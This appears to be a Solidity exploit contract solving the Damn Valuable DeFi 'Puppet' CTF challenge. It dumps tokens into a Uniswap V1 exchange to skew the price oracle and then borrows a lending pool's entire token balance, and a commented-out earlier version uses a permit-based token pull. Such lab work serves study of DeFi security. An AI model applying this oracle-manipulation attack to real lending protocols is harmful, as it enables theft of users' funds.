// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "../DamnValuableToken.sol";
import "../puppet/PuppetPool.sol";

contract attackTimePuppet
{
    PuppetPool public pool;
    address public uniswap;
    DamnValuableToken public token;
    address public player;

    constructor(PuppetPool _pool, address _uniswap, DamnValuableToken _token, address _player) payable
    {
        pool = _pool;
        uniswap = _uniswap;
        token = _token;        
        player = _player;
    }
    //START
    //         //We transfer user funds to this contract
    //         //We approve tokens to uniswap
    //         //we dump all tokens from contract to uniswap and make ETH zero or close to zero
    //         //we borrow all tokens from pool since its now cheap af
    //         //we dump all tokenbs to user
        uint256 public UNISWAP_INITIAL_TOKEN_RESERVE = 10 * 10 ** 18 ; 
        uint256 public UNISWAP_INITIAL_ETH_RESERVE = 10 * 10 ** 18 ; 
        uint256 public PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 10 ** 18 ; 
        uint256 public PLAYER_INITIAL_ETH_BALANCE = 25 * 10 ** 18 ; 
        uint256 public POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18 ; 

    function attack() public 
    {
        token.approve(uniswap, type(uint256).max);
        uint256 ethBuyable = calculateTokenToEthInputPrice(
            PLAYER_INITIAL_TOKEN_BALANCE,
            UNISWAP_INITIAL_TOKEN_RESERVE,
            UNISWAP_INITIAL_ETH_RESERVE
            );        
        
        console.log("ETHER TO input price is ", ethBuyable);
        console.log("token balanec of attacker contract is  ", token.balanceOf(address(this)));



        (bool result,) = uniswap.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            PLAYER_INITIAL_TOKEN_BALANCE,
            ethBuyable - 1, 
            type(uint256).max)
            );
        
        console.log("uniswap call result is ", result);

        console.log("ether balance of contract is ", address(this).balance );

        //we borrow all tokens from pool and add msg.sender as recipient
        pool.borrow{value: 20 ether}(POOL_INITIAL_TOKEN_BALANCE, player );

    }

      function calculateTokenToEthInputPrice(uint256 tokens_sold,uint256 tokensInReserve,uint256 etherInReserve) public pure returns(uint256)
    {
        return (tokens_sold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokens_sold * 997);
    }

    // To receive the ether that the Uniswap contract will send
    fallback() external payable {}
    receive() external payable {}

}
// DamnValuableToken token;
//     address uniswap;
//     /**   
//    * @param _uniswap address of V1 uniswap
//    * @param _token address of ERC token of damndefi
//    */
//     constructor(PuppetPool _pool, address _uniswap, DamnValuableToken _token, uint8 v, bytes32 r, bytes32 s)
//     {

//         // What we have to do here is simple, _computeOraclePrice relies on uniswap balance
//         // we drain ETH balance of uniswap, for that we need to give tokens to Uniswap

//         // We calculate token to Eth price and trade uniswap for the whole amount of ETH it has
//         // const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
//         // const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

//         // const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
//         // const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

//         // const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n; 
//         //START
//         //We approve user funds to this contract
//         //we transfer the tokens of user to ths cintract throgh permit
//         //we dump all tokens from contract to uniswap and make ETH zero or close to zero
//         //we borrow all tokens from pool since its now cheap af
//         //we dump all tokenbs to user

//         uint256 playerTokens = _token.balanceOf(msg.sender);

//         console.log("MSG SENDER ADDDRESS IS ",msg.sender);

//         console.log("DOMAIN INSIDE CONTRACT");
//         console.log("name in contract ", _token.name() );
//         console.log("block.chainid in contract ",block.chainid);
//         console.log("CONNTRACT ADDRESS IS ?", address(this));

//         //we transfer the tokens of user to ths cintract throgh permit
//         //_token.permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s);
//         _token.permit(msg.sender, address(this), type(uint256).max , type(uint256).max , v, r, s);
//         console.log("REACHEFD 46");
//         _token.transferFrom(msg.sender, address(this), playerTokens);
//         console.log("REACHEFD 48");
//         _token.approve(_uniswap, type(uint256).max);
//         console.log("REACHEFD 50");
//         //we dump all tokens from contract to uniswap and make ETH zero or close to zero
//         uint256 ethBuyable = calculateTokenToEthInputPrice(1000 * 10 ** 18 , 10*10**18 , 10*10**18);        

//         console.log("ETH THATS BUYABLE ",ethBuyable);

//         (bool result,) = _uniswap.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", ethBuyable, ethBuyable, type(uint256).max));
        
//         console.log("uniswap call result is ", result);

//         //we borrow all tokens from pool and add msg.sender as recipient
//         _pool.borrow(100000 * 10 ** 18, msg.sender);


//     }

//     /**
//    * @notice Public price function for Token to ETH trades with an exact input.
//    * @param tokens_sold Amount of Tokens sold.
//    * @return Amount of ETH that can be bought with input Tokens.
//    */                                                          
//     function calculateTokenToEthInputPrice(uint256 tokens_sold,uint256 tokensInReserve,uint256 etherInReserve) public pure returns(uint256)
//     {
//         return (tokens_sold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokens_sold * 997);
//     }
    
//     /** 
//    * @notice Convert Tokens to ETH.
//    * @dev User specifies exact input && minimum output.
//    * @param tokens_sold Amount of Tokens sold.
//    * @param min_eth Minimum ETH purchased.
//    * @param deadline Time after which this transaction can no longer be executed.
//    * @return Amount of ETH bought.
//    */
// //   function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) public returns (uint256) {
// //     return tokenToEthInput(tokens_sold, min_eth, deadline, msg.sender, msg.sender);
// //   }

//     // function checkPrintSignature()
//     // {
//     //     unchecked {
//     //         address recoveredAddress = ecrecover(
//     //             keccak256(
//     //                 abi.encodePacked(
//     //                     "\x19\x01",
//     //                     DOMAIN_SEPARATOR(),
//     //                     keccak256(
//     //                         abi.encode(
//     //                             keccak256(
//     //                                 "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
//     //                             ),
//     //                             owner,
//     //                             spender,
//     //                             value,
//     //                             nonces[owner]++,
//     //                             deadline
//     //                         )
//     //                     )
//     //                 )
//     //             ),
//     //             v,
//     //             r,
//     //             s
//     //         );
//     // }
//     //  function computeDomainSeparator() internal view virtual returns (bytes32) {
//     //     return
//     //         keccak256(
//     //             abi.encode(
//     //                 keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
//     //                 keccak256(bytes(name)),
//     //                 keccak256("1"),
//     //                 block.chainid,
//     //                 address(this)
//     //             )
//     //         );
//     // }

// }



// // console.log("UNiswap balance ether")
// //         console.log(await ethers.provider.getBalance(uniswapExchange.address));
// //         console.log("UNiswap balance tokens")
// //         console.log(await token.balanceOf(uniswapExchange.address));

// //         await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
// //         uniswapExchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 9n * 10n**18n, 121231231231233123123123123123123123);

// //         console.log("UNiswap balance ether")
// //         console.log(await ethers.provider.getBalance(uniswapExchange.address));
// //         console.log("UNiswap balance tokens")
// //         console.log(await token.balanceOf(uniswapExchange.address));